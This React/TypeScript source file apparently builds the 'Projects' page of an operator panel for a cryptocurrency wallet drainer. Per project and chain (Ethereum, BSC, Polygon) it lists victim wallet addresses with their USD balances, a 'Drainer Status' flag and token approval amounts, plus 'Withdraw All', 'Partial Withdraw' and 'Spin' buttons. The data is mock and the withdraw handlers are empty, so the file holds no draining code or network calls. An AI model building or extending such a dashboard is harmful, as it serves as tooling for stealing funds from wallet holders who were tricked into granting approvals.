import React, { useState } from 'react';
import { Plus, Search, Pin, Trash2, DollarSign, RotateCw, Copy, Check, X, Wallet, ArrowUpRight } from 'lucide-react';
import UserModal from '../components/UserModal';
import DeleteConfirmModal from '../components/DeleteConfirmModal';
import { motion, AnimatePresence } from 'framer-motion';

interface Network {
  id: string;
  name: string;
  symbol: string;
  color: string;
}

interface User {
  id: string;
  walletAddress: string;
  balance: {
    token: string;
    usd: number;
  };
  isDrainerConnected: boolean;
  approveAmount: number;
  isPinned: boolean;
}

interface Project {
  id: string;
  name: string;
  network: Network;
  users: User[];
}

const Projects: React.FC = () => {
  const networks: Network[] = [
    { id: 'eth', name: 'Ethereum', symbol: 'ETH', color: '#627EEA' },
    { id: 'bsc', name: 'BSC', symbol: 'BNB', color: '#F3BA2F' },
    { id: 'polygon', name: 'Polygon', symbol: 'MATIC', color: '#8247E5' }
  ];

  const [projects] = useState<Project[]>([
    {
      id: '1',
      name: 'DD',
      network: networks[0], // ETH
      users: [
        {
          id: 'user1',
          walletAddress: '0x1234...5678',
          balance: { token: 'ETH', usd: 5000 },
          isDrainerConnected: true,
          approveAmount: 1000,
          isPinned: true
        },
        {
          id: 'user2',
          walletAddress: '0x8765...4321',
          balance: { token: 'ETH', usd: 2500 },
          isDrainerConnected: true,
          approveAmount: 800,
          isPinned: false
        }
      ]
    },
    {
      id: '2',
      name: 'XProject',
      network: networks[1], // BSC
      users: [
        {
          id: 'user3',
          walletAddress: '0xdef1...2345',
          balance: { token: 'BNB', usd: 3000 },
          isDrainerConnected: true,
          approveAmount: 1500,
          isPinned: true
        }
      ]
    },
    {
      id: '3',
      name: 'CryptoFlow',
      network: networks[2], // Polygon
      users: [
        {
          id: 'user4',
          walletAddress: '0xaaaa...bbbb',
          balance: { token: 'MATIC', usd: 1800 },
          isDrainerConnected: true,
          approveAmount: 600,
          isPinned: false
        }
      ]
    }
  ]);

  const [selectedProject, setSelectedProject] = useState<Project | null>(null);
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [showUserModal, setShowUserModal] = useState(false);
  const [showDeleteModal, setShowDeleteModal] = useState(false);
  const [copiedAddress, setCopiedAddress] = useState<string | null>(null);
  const [projectSearch, setProjectSearch] = useState('');
  const [userSearch, setUserSearch] = useState('');

  const handleCopyAddress = async (address: string) => {
    await navigator.clipboard.writeText(address);
    setCopiedAddress(address);
    setTimeout(() => setCopiedAddress(null), 2000);
  };

  const filteredProjects = projects.filter(project =>
    project.name.toLowerCase().includes(projectSearch.toLowerCase())
  );

  const filteredUsers = selectedProject?.users.filter(user =>
    user.id.toLowerCase().includes(userSearch.toLowerCase()) ||
    user.walletAddress.toLowerCase().includes(userSearch.toLowerCase())
  ) || [];

  return (
    <div className="max-w-7xl mx-auto">
      <div className="flex justify-between items-center mb-6">
        <h1 className="text-2xl font-bold">Projects</h1>
        <button
          onClick={() => setShowUserModal(true)}
          className="flex items-center gap-2 px-4 py-2 bg-green-400 text-[#1e1f25] rounded-lg hover:bg-green-500 transition-colors"
        >
          <Plus size={20} />
          Add User
        </button>
      </div>

      {/* Project Search */}
      <div className="mb-6">
        <div className="relative">
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
          <input
            type="text"
            placeholder="Search projects..."
            value={projectSearch}
            onChange={(e) => setProjectSearch(e.target.value)}
            className="w-full bg-[#1e1f25] border border-gray-700 rounded-lg py-2 pl-10 pr-4 text-white focus:outline-none focus:ring-1 focus:ring-green-500"
          />
        </div>
      </div>

      {/* Project Selection */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
        {filteredProjects.map(project => (
          <motion.button
            key={project.id}
            whileHover={{ scale: 1.02, y: -5 }}
            whileTap={{ scale: 0.98 }}
            onClick={() => setSelectedProject(project)}
            className={`relative overflow-hidden p-6 rounded-xl text-center transition-all duration-300 ${
              selectedProject?.id === project.id 
                ? 'bg-gradient-to-br from-green-400 to-green-500 text-[#1e1f25] shadow-lg shadow-green-400/20' 
                : 'bg-[#1e1f25] text-white hover:shadow-lg hover:shadow-[#2a2b33]/20'
            }`}
          >
            {/* Background Pattern */}
            <div 
              className="absolute inset-0 opacity-10"
              style={{
                backgroundImage: `radial-gradient(circle at 50% -20%, ${project.network.color}, transparent 70%)`
              }}
            />
            
            {/* Content */}
            <div className="relative z-10">
              <div className="font-bold text-2xl mb-4">{project.name}</div>
              
              <div className="flex flex-col items-center gap-3">
                <div
                  className="w-16 h-16 rounded-full flex items-center justify-center mb-2 transition-transform duration-300 hover:rotate-180"
                  style={{ 
                    background: `conic-gradient(${project.network.color} 0deg, transparent 60deg)`,
                    padding: '2px'
                  }}
                >
                  <div className="w-full h-full rounded-full bg-[#2a2b33] flex items-center justify-center">
                    <div
                      className="w-8 h-8 rounded-full"
                      style={{ backgroundColor: project.network.color }}
                    />
                  </div>
                </div>
                
                <div>
                  <div className="font-medium text-lg">{project.network.name}</div>
                  <div className="text-sm opacity-75">{project.network.symbol}</div>
                </div>
              </div>

              <div className="mt-4 pt-4 border-t border-gray-700/30">
                <div className="flex items-center justify-center gap-2">
                  <Wallet size={16} />
                  <span>{project.users.length} users</span>
                </div>
              </div>
            </div>
          </motion.button>
        ))}
      </div>

      {selectedProject && (
        <>
          {/* User Search */}
          <div className="mb-6">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
              <input
                type="text"
                placeholder="Search by User ID or wallet address..."
                value={userSearch}
                onChange={(e) => setUserSearch(e.target.value)}
                className="w-full bg-[#1e1f25] border border-gray-700 rounded-lg py-2 pl-10 pr-4 text-white focus:outline-none focus:ring-1 focus:ring-green-500"
              />
            </div>
          </div>

          {/* Users Grid */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
            {filteredUsers.map(user => (
              <motion.button
                key={user.id}
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                onClick={() => setSelectedUser(user)}
                className="relative bg-[#1e1f25] p-6 rounded-xl text-left hover:bg-[#2a2b33] transition-all duration-300 group"
              >
                {/* Gradient Border */}
                <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-green-400/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity" />
                
                {/* Content */}
                <div className="relative z-10">
                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center gap-2">
                      <div className={`w-2 h-2 rounded-full ${user.isDrainerConnected ? 'bg-green-400' : 'bg-red-400'}`} />
                      <span className="font-mono text-sm">{user.walletAddress}</span>
                    </div>
                    {user.isPinned && (
                      <Pin size={16} className="text-green-400" />
                    )}
                  </div>

                  <div className="space-y-2">
                    <div className="text-sm text-gray-400">
                      ID: {user.id}
                    </div>
                    <div className="flex items-center gap-2 text-lg font-medium">
                      <ArrowUpRight size={20} className="text-green-400" />
                      ${user.balance.usd.toLocaleString()}
                    </div>
                  </div>

                  <div className="absolute bottom-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity">
                    <div className="text-green-400/30 transform rotate-45">
                      <ArrowUpRight size={40} />
                    </div>
                  </div>
                </div>
              </motion.button>
            ))}
          </div>
        </>
      )}

      {/* User Details Modal */}
      <AnimatePresence>
        {selectedUser && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50"
            onClick={() => setSelectedUser(null)}
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
              className="bg-[#1e1f25] rounded-xl p-6 w-full max-w-2xl m-4 shadow-xl"
            >
              <div className="flex justify-between items-start mb-6">
                <div className="space-y-2">
                  <h2 className="text-xl font-bold">User Details</h2>
                  <div className="space-y-1">
                    <div className="text-sm text-gray-400">User ID:</div>
                    <div className="font-medium">{selectedUser.id}</div>
                  </div>
                  <div className="space-y-1">
                    <div className="text-sm text-gray-400">Wallet Address:</div>
                    <button
                      onClick={() => handleCopyAddress(selectedUser.walletAddress)}
                      className="flex items-center gap-2 px-3 py-1.5 bg-[#2a2b33] rounded-lg hover:bg-[#353640] transition-colors"
                    >
                      <span className="font-mono">{selectedUser.walletAddress}</span>
                      {copiedAddress === selectedUser.walletAddress ? (
                        <Check size={16} className="text-green-400" />
                      ) : (
                        <Copy size={16} />
                      )}
                    </button>
                  </div>
                </div>
                <button
                  onClick={() => setSelectedUser(null)}
                  className="p-2 hover:bg-[#2a2b33] rounded-lg transition-colors"
                >
                  <X size={24} />
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
                <div className="bg-[#2a2b33] p-4 rounded-lg">
                  <div className="text-gray-400 mb-1">Balance</div>
                  <div className="text-xl font-bold">
                    {selectedUser.balance.token} (${selectedUser.balance.usd})
                  </div>
                </div>
                <div className="bg-[#2a2b33] p-4 rounded-lg">
                  <div className="text-gray-400 mb-1">Drainer Status</div>
                  <div className={selectedUser.isDrainerConnected ? 'text-green-400' : 'text-red-400'}>
                    {selectedUser.isDrainerConnected ? 'Connected' : 'Disconnected'}
                  </div>
                </div>
                <div className="bg-[#2a2b33] p-4 rounded-lg">
                  <div className="text-gray-400 mb-1">Approve Amount</div>
                  <div>${selectedUser.approveAmount}</div>
                </div>
              </div>

              <div className="flex gap-2">
                <motion.button
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={() => {}}
                  className="flex items-center gap-2 bg-green-400 text-[#1e1f25] px-4 py-2 rounded-lg hover:bg-green-500 transition-colors"
                >
                  <DollarSign size={20} />
                  Withdraw All
                </motion.button>
                <motion.button
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={() => {}}
                  className="flex items-center gap-2 bg-[#2a2b33] text-white px-4 py-2 rounded-lg hover:bg-[#353640] transition-colors"
                >
                  <DollarSign size={20} />
                  Partial Withdraw
                </motion.button>
                <motion.button
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={() => {}}
                  className="flex items-center gap-2 bg-[#2a2b33] text-white px-4 py-2 rounded-lg hover:bg-[#353640] transition-colors"
                >
                  <RotateCw size={20} />
                  Spin
                </motion.button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Add User Modal */}
      <UserModal
        isOpen={showUserModal}
        onClose={() => setShowUserModal(false)}
        onSubmit={(userData) => {
          console.log('Add user:', userData);
          setShowUserModal(false);
        }}
      />

      {/* Delete Confirmation Modal */}
      <DeleteConfirmModal
        isOpen={showDeleteModal}
        onClose={() => setShowDeleteModal(false)}
        onConfirm={() => {
          console.log('Delete user:', selectedUser);
          setShowDeleteModal(false);
        }}
      />
    </div>
  );
};

export default Projects;